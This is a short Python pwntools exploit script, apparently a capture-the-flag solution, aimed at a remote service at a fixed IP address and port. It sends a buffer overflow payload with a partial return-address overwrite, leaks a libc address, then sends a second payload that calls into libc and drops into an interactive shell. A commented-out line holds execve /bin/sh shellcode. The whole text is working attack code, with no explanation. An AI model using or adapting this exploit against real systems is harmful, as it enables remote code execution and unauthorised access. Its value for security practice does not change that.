from pwn import *

#s = remote('192.168.33.10',1234)
for i in range(0x3,0x4):
  s = remote('110.10.147.38', 8888)
  s.recvuntil('Year')
  s.sendline('400')
  s.recvuntil('Write')
  dat = p32(0x080483C0)
  dat += p32(0xdeadbeef)
  dat += p32(0x0804A010)
  #dat += "\x90"*20
  #dat += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
  dat += "A"*(0x16d-len(dat))
  s.sendline(dat+p8(0xc+(i*0x10)))
  print [s.recvuntil('cat flag\n')]
  try:
    print i
    libc = u32(s.recv(4)) - 0x18540
    print hex(libc)
    s = remote('110.10.147.38', 8888)
    s.recvuntil('Year')
    s.sendline('400')
    s.recvuntil('Write')
    dat = p32(libc+0x3a940)
    dat += p32(0xdeadbeef)
    dat += p32(0x080487E0)
    dat += "A"*(0x16d-len(dat))
    s.sendline(dat+p8(0xc+(i*0x10)))

  except:
    continue;
s.interactive()
